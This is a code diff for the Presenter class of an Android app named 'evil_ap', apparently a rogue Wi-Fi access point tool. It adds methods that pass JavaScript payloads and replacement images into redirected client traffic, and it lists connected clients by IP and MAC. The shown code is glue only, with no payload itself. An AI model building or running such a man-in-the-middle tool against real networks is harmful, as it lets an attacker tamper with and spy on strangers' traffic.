@@ -1,11 +1,15 @@
 package com.nibiru.evil_ap;
 
+import android.app.Activity;
 import android.content.Context;
+import android.net.Uri;
+import android.support.v4.util.Pair;
 
 import com.nibiru.evil_ap.log.Client;
 
 import java.lang.ref.WeakReference;
 import java.util.ArrayList;
+import java.util.List;
 
 /**
  * Created by Nibiru on 2016-12-06.
@@ -35,40 +39,20 @@ public class Presenter implements IMVP.PresenterOps, IMVP.RequiredPresenterOps {
         mModel.onTrafficRedirect(traffic, on);
     }
 
-    public ArrayList<Client> getCurrentClients() {
-        ArrayList<String> output = mModel.getCurrentClients();
-        ArrayList<Client> clients = new ArrayList<>(output.size());
-        for (String line : output) {
-            String[] split = line.split(" +");
-            //IP idx = 0 , MAC idx = 4, flags idx = 5
-            if (split.length == 6 && (split[5].equals("REACHABLE") || split[5].equals("STALE"))) {
-                clients.add(new Client(split[0], split[4]));
-            }
-        }
-        clients.add(new Client("192.168.0.12", "vdfsdddsdfdas"));
-        clients.add(new Client("192.168.0.13", "vdfsdddsdfdas"));
-        clients.add(new Client("192.168.0.14", "vdfsdddsdfdas"));
-        return clients;
+    public void onLoadReplaceImg(Uri uri, Activity act) {
+        mModel.onLoadReplaceImg(uri, act);
+    }
+
+    public void onJsPayloadApply(List<Pair<Integer, String>> payloads) {
+        mModel.onJsPayloadApply(payloads);
     }
 
     public boolean isApOn(Context ctx) {
         return mModel.isApOn(ctx);
     }
 
-    public void setContext(Context ctx) { this.ctx = ctx;}
-
-    @Override
-    public boolean checkIfSharedPrefsNull() {
-        return mModel.checkIfSharedPrefsNull();
-    }
-
-    @Override
-    public boolean checkIfSharedPrefsContain(String tag) {
-        return mModel.checkIfSharedPrefsContain(tag);
-    }
-
     public boolean apBtnPressed(String SSID, String pass, Context ctx) {
-        return mModel.apToggle(SSID, pass, ctx);
+        return mModel.onApToggle(SSID, pass, ctx);
     }
 
     public void checkIfDeviceRooted() {
@@ -77,6 +61,8 @@ public class Presenter implements IMVP.PresenterOps, IMVP.RequiredPresenterOps {
                     "root permissions.");
         }
     }
+
+    public void setContext(Context ctx) { this.ctx = ctx;}
 
     public void setSharedPrefsInt(String tag, int val) {
         mModel.setSharedPrefsInt(tag, val);
@@ -90,6 +76,18 @@ public class Presenter implements IMVP.PresenterOps, IMVP.RequiredPresenterOps {
         mModel.setSharedPrefsString(tag,val);
     }
 
+    public ArrayList<Client> getCurrentClients() {
+        ArrayList<String> output = mModel.getCurrentClients();
+        ArrayList<Client> clients = new ArrayList<>(output.size());
+        for (String line : output) {
+            String[] split = line.split(" +");
+            //IP idx = 0 , MAC idx = 4, flags idx = 5
+            if (split.length == 6 && (split[5].equals("REACHABLE") || split[5].equals("STALE"))) {
+                clients.add(new Client(split[0], split[4]));
+            }
+        }
+        return clients;
+    }
     public int getSharedPrefsInt(String tag) {
         return mModel.getSharedPrefsInt(tag);
     }
@@ -101,6 +99,7 @@ public class Presenter implements IMVP.PresenterOps, IMVP.RequiredPresenterOps {
     public String getSharedPrefsString(String tag) {
         return mModel.getSharedPrefsString(tag);
     }
+    public SharedClass getSharedObj(){ return mModel.getSharedObj();}
 
     /**
      * Sent from Activity after a configuration changes
